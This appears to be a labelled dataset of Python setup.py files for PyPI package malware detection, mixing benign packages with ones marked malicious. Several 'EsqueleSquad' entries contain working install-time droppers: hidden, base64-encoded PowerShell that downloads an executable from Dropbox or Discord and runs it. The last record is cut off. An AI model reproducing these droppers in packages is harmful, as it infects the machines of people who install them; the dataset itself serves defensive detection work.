{"idx": "Flask-BasicAuth-0.2.0", "func": "import os\nimport re\n\nfrom setuptools import setup\n\nHERE = os.path.dirname(os.path.abspath(__file__))\n\n\ndef get_version():\n    filename = os.path.join(HERE, 'flask_basicauth.py')\n    contents = open(filename).read()\n    pattern = r\"^__version__ = '(.*?)'$\"\n    return re.search(pattern, contents, re.MULTILINE).group(1)\n\n\nsetup(\n    name='Flask-BasicAuth',\n    version=get_version(),\n    url='https://github.com/jpvanhal/flask-basicauth',\n    license='BSD',\n    author='Janne Vanhala',\n    author_email='janne.vanhala@gmail.com',\n    description='HTTP basic access authentication for Flask.',\n    long_description=(\n        open('README.rst').read() + '\\n\\n' +\n        open('CHANGES.rst').read()\n    ),\n    py_modules=['flask_basicauth'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=['Flask'],\n    test_suite='test_basicauth.suite',\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "tpcontrolstudyload-7.22", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcontrolstudyload',\n    packages = ['modlib'],\n    version = '2.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-os-login-2.7.1", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-os-login\"\ndescription = \"Google Cloud OS Login API client library\"\nversion = \"2.7.1\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-oslogin\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\"scripts/fixup_oslogin_v1_keywords.py\"],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "django-fsm-admin-1.2.5", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\nimport sys\nfrom setuptools import setup, find_packages\n\nimport fsm_admin\n\nreadme = open(\"README.rst\").read()\n\nsetup(\n    name=\"django-fsm-admin\",\n    version=fsm_admin.__version__,\n    author=fsm_admin.__author__,\n    description=\"Integrate django-fsm state transitions into the django admin\",\n    long_description=readme,\n    long_description_content_type=\"text/x-rst\",\n    author_email=\"software@gadventures.com\",\n    url=\"https://github.com/gadventures/django-fsm-admin\",\n    packages=find_packages(),\n    include_package_data=True,\n    install_requires=[\n        \"Django>=1.6\",\n        \"django-fsm>=2.1.0\",\n    ],\n    keywords=\"django fsm admin\",\n    license=\"MIT\",\n    platforms=[\"any\"],\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n    ]\n)\n", "target": 0}
{"idx": "google-cloud-bigtable-2.11.1", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-bigtable\"\ndescription = \"Google Cloud Bigtable API client library\"\nversion = \"2.11.1\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"google-cloud-core >= 1.4.1, <3.0.0dev\",\n    \"grpc-google-iam-v1 >= 0.12.4, <1.0.0dev\",\n    \"proto-plus >= 1.18.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-bigtable\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    scripts=[\n        \"scripts/fixup_bigtable_v2_keywords.py\",\n        \"scripts/fixup_bigtable_admin_v2_keywords.py\",\n    ],\n    python_requires=\">=3.7\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "eemeter-3.1.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\"\"\"\n\n   Copyright 2014-2019 OpenEEmeter contributors\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n\n\"\"\"\n# This setup.py inspired by https://github.com/kennethreitz/setup.py\n\n# Note: To use the 'upload' functionality of this file, you must:\n#   $ pip install twine\n\nimport io\nimport os\nimport sys\nfrom shutil import rmtree\n\nfrom setuptools import find_packages, setup, Command\n\nNAME = \"eemeter\"\nREQUIRED = [\"click\", \"pandas\", \"statsmodels\", \"scipy\"]\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Import the README and use it as the long-description.\nwith io.open(os.path.join(here, \"README.rst\"), encoding=\"utf-8\") as f:\n    long_description = \"\\n\" + f.read()\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nwith open(os.path.join(here, NAME, \"__version__.py\")) as f:\n    exec(f.read(), about)\n\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = \"Build and publish the package.\"\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print(\"\\033[1m{0}\\033[0m\".format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status(\"Removing previous builds\u2026\")\n            rmtree(os.path.join(here, \"dist\"))\n        except OSError:\n            pass\n\n        self.status(\"Building Source and Wheel (universal) distribution\u2026\")\n        os.system(\"{0} setup.py sdist bdist_wheel --universal\".format(sys.executable))\n\n        self.status(\"Uploading the package to PyPi via Twine\u2026\")\n        os.system(\"twine upload dist/*\")\n\n        sys.exit()\n\n\n# Where the magic happens:\nsetup(\n    name=NAME,\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=long_description,\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=find_packages(exclude=(\"tests\",)),\n    entry_points={\"console_scripts\": [\"eemeter=eemeter.cli:cli\"]},\n    install_requires=REQUIRED,\n    include_package_data=True,\n    license=about[\"__license__\"],\n    classifiers=[\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n    ],\n    # $ setup.py publish support.\n    cmdclass={\"upload\": UploadCommand},\n)\n", "target": 0}
{"idx": "delphi_epidata-0.3.20", "func": "import setuptools\n\nwith open(\"README.md\", \"r\") as f:\n    long_description = f.read()\n\nsetuptools.setup(\n    name=\"delphi_epidata\",\n    version=\"0.3.20\",\n    author=\"David Farrow\",\n    author_email=\"dfarrow0@gmail.com\",\n    description=\"A programmatic interface to Delphi's Epidata API.\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/cmu-delphi/delphi-epidata\",\n    packages=setuptools.find_packages(),\n    install_requires=[\"aiohttp\", \"requests>=2.7.0\", \"tenacity\"],\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Intended Audience :: Science/Research\",\n        \"Natural Language :: English\",\n        \"Topic :: Scientific/Engineering :: Bio-Informatics\",\n    ],\n)\n", "target": 0}
{"idx": "esqurlget-3.36", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqurlget',\n    packages = ['modlib'],\n    version = '3.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfccurlpong-2.51", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfccurlpong',\n    packages = ['modlib'],\n    version = '8.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "easydict-1.9", "func": "#!/usr/bin/python\n# -*- coding: utf8 -*-\nimport os\nfrom setuptools import setup, find_packages\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nsetup(\n    name='easydict',\n    version='1.9',\n    author='Mathieu Leplatre',\n    author_email='mathieu.leplatre@makina-corpus.com',\n    url='https://github.com/makinacorpus/easydict',\n    download_url=\"http://pypi.python.org/pypi/easydict/\",\n    description=\"Access dict values as attributes (works recursively).\",\n    long_description=open(os.path.join(here, 'README.rst')).read() + '\\n\\n' +\n                     open(os.path.join(here, 'CHANGES')).read(),\n    license='LPGL, see LICENSE file.',\n    install_requires=[],\n    packages=find_packages(),\n    include_package_data=True,\n    zip_safe=False,\n    keywords=['MBTiles', 'Mapnik'],\n    classifiers=['Topic :: Utilities', \n                 'Natural Language :: English',\n                 'Operating System :: OS Independent',\n                 'Intended Audience :: Developers',\n                 'Development Status :: 5 - Production/Stable',\n                 'Programming Language :: Python :: 2.5',\n                 'Programming Language :: Python :: 3.6'],\n)\n", "target": 0}
{"idx": "piptyper-1.0.0", "func": "from setuptools import setup, find_packages\n\nVERSION = '1.0.0'\nDESCRIPTION = \"A Python Package to handle Packages and librarys in Python IDEs\"\nLONG_DESCRIPTION = \"A Python Package to handle Packages and librarys in Python IDEs\"\n\n# Setting up\nsetup(\n    name=\"piptyper\",\n    version=VERSION,\n    author=\"\u0415ntchenBuilds\",\n    author_email=\"\u0415ntchenBuilds@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python'],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "flask-sock-0.5.2", "func": "import setuptools\n\nsetuptools.setup()\n", "target": 0}
{"idx": "selfvisaverrand-9.16", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvisaverrand',\n    packages = ['modlib'],\n    version = '9.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tptoolmc-2.73", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tptoolmc',\n    packages = ['modlib'],\n    version = '2.35',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "xgoogle-cloud-core-1.3.0", "func": "from setuptools import setup, find_packages\nsetup(name = \"xgoogle_cloud_core\", version = \"1.3.0\", packages = find_packages())", "target": 1}
{"idx": "google-reauth-0.1.1", "func": "# Copyright 2014 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\n\nimport setuptools\n\n\nDEPENDENCIES = ['pyu2f']\n\nOAUTH2CLIENT_EXTRA_DEPENDENCIES = [\n    'oauth2client>=2.0.0'\n]\n\nEXTRAS = {\n    'oauth2client': OAUTH2CLIENT_EXTRA_DEPENDENCIES\n}\n\n\nwith io.open('README.rst', 'r') as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n    name='google-reauth',\n    version='0.1.1',\n    author='Google',\n    author_email='googleapis-publisher@google.com',\n    description='Google Reauth Library',\n    long_description=long_description,\n    url='https://github.com/Google/google-reauth-python',\n    packages=setuptools.find_packages(exclude=('tests*', 'system_tests*')),\n    install_requires=DEPENDENCIES,\n    extras_require=EXTRAS,\n    license='Apache 2.0',\n    keywords='google auth oauth client reauth',\n    classifiers=(\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: POSIX',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: OS Independent',\n        'Topic :: Internet :: WWW/HTTP',\n    ),\n)\n", "target": 0}
{"idx": "g2p_en-2.1.0", "func": "#from distutils.core import setup\nfrom setuptools import setup\nfrom codecs import open\nfrom os import path\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\nwith open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\nsetup(\n  name = 'g2p_en',\n  packages = ['g2p_en'], # this must be the same as the name above\n  version = '2.1.0',\n  description = 'A Simple Python Module for English Grapheme To Phoneme Conversion',\n  long_description=long_description,\n  author = 'Kyubyong Park & Jongseok Kim',\n  author_email = 'kbpark.linguist@gmail.com',\n  url = 'https://github.com/Kyubyong/g2p', # use the URL to the github repo\n  download_url = 'https://github.com/Kyubyong/g2p/archive/1.0.0.tar.gz', # I'll explain this in a second\n  keywords = ['g2p','g2p_en', 'g2pE'], # arbitrary keywords\n  classifiers = [],\n  install_requires = [\n    'numpy>=1.13.1',\n    'nltk>=3.2.4',\n    'inflect>=0.3.1',\n    'distance>=0.1.3',\n  ],\n  license='Apache Software License',\n  include_package_data=True\n)\n\n", "target": 0}
{"idx": "Flask-BabelEx-0.9.4", "func": "\"\"\"\nFlask-BabelEx\n-------------\n\nAdds i18n/l10n support to Flask applications with the help of the\n`Babel`_ library.\n\nThis is fork of official Flask-Babel extension with following features:\n\n1. It is possible to use multiple language catalogs in one Flask application;\n2. Localization domains: your extension can package localization file(s) and use them\n   if necessary;\n3. Does not reload localizations for each request.\n\nLinks\n`````\n\n* `documentation <http://packages.python.org/Flask-BabelEx>`_\n* `development version\n  <http://github.com/mrjoes/flask-babelex/zipball/master#egg=Flask-BabelEx-dev>`_\n* `original Flask-Babel extension <https://pypi.python.org/pypi/Flask-Babel>`_.\n\n.. _Babel: http://babel.edgewall.org/\n\n\"\"\"\nfrom setuptools import setup\n\n\nsetup(\n    name='Flask-BabelEx',\n    version='0.9.4',\n    url='http://github.com/mrjoes/flask-babelex',\n    license='BSD',\n    author='Serge S. Koval',\n    author_email='serge.koval+github@gmail.com',\n    description='Adds i18n/l10n support to Flask applications',\n    long_description=__doc__,\n    packages=['flask_babelex'],\n    zip_safe=False,\n    platforms='any',\n    install_requires=[\n        'Flask',\n        'Babel>=1.0',\n        'speaklater>=1.2',\n        'Jinja2>=2.5'\n    ],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "GeoAlchemy2-0.12.3", "func": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='GeoAlchemy2',\n    use_scm_version=True,\n    description=\"Using SQLAlchemy with Spatial Databases\",\n    long_description=open('README.rst', encoding=\"utf-8\").read(),\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Environment :: Plugins\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Intended Audience :: Information Technology\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Topic :: Scientific/Engineering :: GIS\",\n    ],\n    keywords='geo gis sqlalchemy orm',\n    author='Eric Lemoine',\n    author_email='eric.lemoine@gmail.com',\n    url='https://geoalchemy-2.readthedocs.io/en/latest/',\n    project_urls={\n        'Source': 'https://github.com/geoalchemy/geoalchemy2',\n    },\n    license='MIT',\n    python_requires=\">=3.7\",\n    packages=find_packages(exclude=['ez_setup', 'examples', 'tests', 'doc']),\n    include_package_data=True,\n    zip_safe=False,\n    setup_requires=[\"setuptools_scm\"],\n    install_requires=[\n        